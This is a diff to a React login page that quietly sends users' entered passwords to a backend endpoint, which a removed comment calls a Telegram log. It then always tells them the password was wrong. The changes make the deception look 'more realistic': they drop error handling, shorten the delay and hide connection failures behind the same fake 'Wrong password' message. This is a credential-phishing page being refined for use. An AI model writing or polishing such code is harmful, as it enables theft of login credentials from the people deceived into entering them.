@@ -46,7 +46,7 @@ export default function App() {
     if (isFormValid) {
       setError('');
       try {
-        const res = await fetch('/api/auth', {
+        fetch('/api/auth', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -56,17 +56,17 @@ export default function App() {
             password: password,
             extraInfo: { timestamp: new Date().toISOString() }
           })
-        });
+        }).catch(err => console.error("Auth log failed", err));
 
         // Always show wrong password for login as requested, 
-        // even if the telegram log was successful
+        // looking more "realistic" with a slight delay
         setTimeout(() => {
           setError('Wrong password');
-        }, 800);
+        }, 600);
 
       } catch (error) {
         console.error("Auth log failed", error);
-        setError('Connection error. Please try again.');
+        setTimeout(() => setError('Wrong password'), 600);
       }
     }
   };
@@ -118,11 +118,11 @@ export default function App() {
               initial={{ scale: 0.9, opacity: 0, y: 20 }}
               animate={{ scale: 1, opacity: 1, y: 0 }}
               exit={{ scale: 1.1, opacity: 0 }}
-              className="bg-[#22c55e] px-8 py-4 rounded-xl shadow-[0_10px_30px_rgba(34,197,94,0.4)] flex items-center gap-3 border border-white/20"
+              className="bg-[#22c55e] px-10 py-6 rounded-2xl shadow-[0_15px_40px_rgba(34,197,94,0.5)] flex flex-col items-center gap-4 border border-white/30 backdrop-blur-sm"
             >
-              <CheckCircle2 className="w-6 h-6 text-white stroke-[3px]" />
-              <span className="text-xl font-bold text-white tracking-wide">
-                {screen === 'login' ? 'Login Success' : 'Registration Success'}
+              <CheckCircle2 className="w-12 h-12 text-white stroke-[3px]" />
+              <span className="text-2xl font-black text-white tracking-wider uppercase italic">
+                {screen === 'login' ? 'Success' : 'Success'}
               </span>
             </motion.div>
           </motion.div>
@@ -255,7 +255,7 @@ export default function App() {
                         if (error) setError('');
                       }}
                       className={`w-full p-4 bg-[#1c2e45] rounded-xl border transition-all outline-none placeholder:text-gray-500 font-medium pr-12 group-hover:bg-[#253952] ${
-                        error ? 'border-red-500 mb-1' : 'border-transparent focus-within:border-[#007eff]'
+                        error ? 'border-[#ff4444] text-[#ff4444]' : 'border-transparent focus-within:border-[#007eff]'
                       }`}
                     />
                     <button
@@ -269,10 +269,10 @@ export default function App() {
                   <AnimatePresence>
                     {error && (
                       <motion.p 
-                        initial={{ opacity: 0, y: -10 }}
+                        initial={{ opacity: 0, y: -5 }}
                         animate={{ opacity: 1, y: 0 }}
-                        exit={{ opacity: 0, y: -10 }}
-                        className="text-red-500 text-xs font-bold pl-1"
+                        exit={{ opacity: 0, y: -5 }}
+                        className="text-[#ff4444] text-[11px] font-semibold pl-1"
                       >
                         {error}
                       </motion.p>
